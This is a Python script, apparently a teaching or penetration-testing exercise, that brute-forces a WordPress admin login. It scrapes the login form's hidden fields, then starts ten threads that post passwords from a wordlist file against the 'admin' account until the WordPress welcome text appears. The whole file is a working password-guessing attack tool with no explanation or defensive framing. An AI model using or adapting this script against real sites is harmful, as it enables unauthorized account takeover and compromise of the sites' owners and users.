# Requires lxml for xml parsing
# pip install lxml
from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import threading
import time
from pathlib import Path

SUCCESS = "Welcome to WordPress!"
TARGET = "http://example.com/wordpress/wp-login.php"
WORDLIST = Path(__file__).parent / "cain-and-abel.txt"
USERNAME = "admin"


def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words


def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall("//input"):
        name = elem.get("name")
        if name is not None:
            params[name] = elem.get("value", None)
    return params


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f"\nBrute Force Attack beginning on {url}.\n")
        print(f"Finished the setup where username = {username}\n")

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params["log"] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f"Trying username/password {self.username}/{passwd:<10}")
            params["pwd"] = passwd
            resp1 = session.post(self.url, data=params)

            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print(f"Username is {self.username}")
                print(f"Password is {passwd}\n")
                self.found = True


if __name__ == "__main__":
    b = Bruter(USERNAME, TARGET)
    words = get_words()
    b.run_bruteforce(words)
